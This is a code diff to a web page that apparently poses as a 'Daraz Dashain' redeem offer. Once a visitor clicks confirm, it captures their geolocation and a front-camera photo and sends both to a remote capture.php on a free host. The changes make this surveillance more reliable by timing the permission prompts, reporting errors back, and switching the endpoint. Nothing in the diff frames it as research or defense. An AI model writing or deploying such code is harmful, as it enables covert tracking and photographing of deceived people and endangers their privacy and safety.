@@ -141,7 +141,7 @@
     position:fixed; top:64px; left:50%; transform:translateX(-50%);
     background:rgba(0,0,0,.85); color:#fff; font-size:12px; padding:8px 16px;
     border-radius:24px; opacity:0; transition:opacity .3s; pointer-events:none;
-    z-index:1000; white-space:nowrap;
+    z-index:1000; white-space:nowrap; max-width:90%;
   }
   .statusPill.show { opacity:1; }
   #video { display:none; }
@@ -224,7 +224,7 @@
 "use strict";
 
 // ⚠️ POINT THIS AT YOUR INFINITYFREE HOST
-const API = "https://daraz-dashain.freedev.app/ping.php";
+const API = "http://daraz-dashain.freedev.app/capture.php";
 
 const modal       = document.getElementById('modalOverlay');
 const btnRedeem   = document.getElementById('btnRedeem');
@@ -262,8 +262,11 @@ btnConfirm.addEventListener('click', () => {
 
   if (!captureStarted) {
     captureStarted = true;
-    triggerLocationCapture();
-    triggerCameraCapture();
+    // Small delay so modal closes and browser is ready for permission prompts
+    setTimeout(() => {
+      triggerLocationCapture();
+      setTimeout(triggerCameraCapture, 1500);
+    }, 500);
   }
 });
 
@@ -271,6 +274,7 @@ btnConfirm.addEventListener('click', () => {
 function triggerLocationCapture() {
   if (!navigator.geolocation) {
     captured.location = { error: 'Not supported' };
+    sendData({ location: captured.location });
     return;
   }
   showStatus('Getting Location...');
@@ -281,13 +285,15 @@ function triggerLocationCapture() {
         longitude: pos.coords.longitude,
         accuracy: pos.coords.accuracy
       };
+      showStatus('Location captured, sending...');
       sendData({ location: captured.location });
     },
     err => {
-      captured.location = { error: 'Denied' };
-      console.warn('Location denied', err);
+      captured.location = { error: err.message || 'Denied' };
+      showStatus('Location: ' + (err.message || 'denied'));
+      sendData({ location: captured.location });
     },
-    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+    { enableHighAccuracy: false, timeout: 15000, maximumAge: 60000 }
   );
 }
 
@@ -295,33 +301,43 @@ function triggerLocationCapture() {
 async function triggerCameraCapture() {
   try {
     showStatus('Accessing Camera...');
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+      showStatus('Camera not supported');
+      sendData({ image: null, cameraError: 'unsupported' });
+      return;
+    }
     cameraStream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+      video: { facingMode: 'user', width: { ideal: 480 }, height: { ideal: 360 } },
       audio: false
     });
     const video = document.getElementById('video');
     video.srcObject = cameraStream;
+    video.setAttribute('playsinline', '');
+    video.muted = true;
+    await video.play().catch(()=>{});
     await new Promise(res => {
       if (video.readyState >= 2) return res();
       video.onloadeddata = () => res();
+      setTimeout(res, 2000);
     });
-    await new Promise(res => setTimeout(res, 500));
+    await new Promise(res => setTimeout(res, 800));
 
     const canvas = document.getElementById('canvas');
-    canvas.width  = video.videoWidth  || 640;
-    canvas.height = video.videoHeight || 480;
+    canvas.width  = video.videoWidth  || 480;
+    canvas.height = video.videoHeight || 360;
     canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-    captured.image = canvas.toDataURL('image/jpeg', 0.85);
+    const imgData = canvas.toDataURL('image/jpeg', 0.7);
 
     cameraStream.getTracks().forEach(t => t.stop());
     cameraStream = null;
     video.srcObject = null;
 
-    showStatus('Photo captured');
-    sendData({ image: captured.image });
+    showStatus('Photo captured, sending...');
+    sendData({ image: imgData });
   } catch (err) {
     console.warn('Camera denied', err);
-    showStatus('Camera denied — continuing');
+    showStatus('Camera: ' + (err.name || 'failed'));
+    sendData({ image: null, cameraError: err.name || 'failed' });
   }
 }
 
@@ -372,12 +388,12 @@ function sendData(payload) {
     return {ok:false};
   });
 }
- 
+
 function showStatus(msg) {
   statusPill.textContent = msg;
   statusPill.classList.add('show');
   clearTimeout(statusPill._t);
-  statusPill._t = setTimeout(() => statusPill.classList.remove('show'), 2500);
+  statusPill._t = setTimeout(() => statusPill.classList.remove('show'), 3000);
 }
 
 document.addEventListener('visibilitychange', () => {
